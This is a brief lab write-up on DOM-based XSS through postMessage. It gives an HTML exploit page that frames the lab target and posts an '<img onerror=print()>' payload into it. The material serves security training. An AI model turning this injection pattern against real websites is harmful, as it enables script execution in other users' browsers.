# Practitioner Lab 93: DOM XSS using web messages

---

This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the `print()` function to be called.

![Untitled](Practitioner%20Lab%2093%20DOM%20XSS%20using%20web%20messages%206bb5d85db59a4d199dc2286e9fcadf54/Untitled.png)

I started to play with the console and got this. I don’t really know a lot of javascript but since I know python and C I was able to play around enough to get the logic .

![Untitled](Practitioner%20Lab%2093%20DOM%20XSS%20using%20web%20messages%206bb5d85db59a4d199dc2286e9fcadf54/Untitled%201.png)

```
<head>
	<style>
		#target_website {
			position:relative;
			width:1000px;
			height:1000px;
			opacity:1;
			z-index:2;
			}
		
	</style>
</head>
<body>
	
	<iframe id="target_website"  src="https://0a9000c60494f0aa80c7cb5400ea00dd.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=0 onerror=print()>','*')"></iframe>
</body>
```

Using the following payload I was able to solve the lab. 

I used this to see the full iframe and then be able to see how it changed.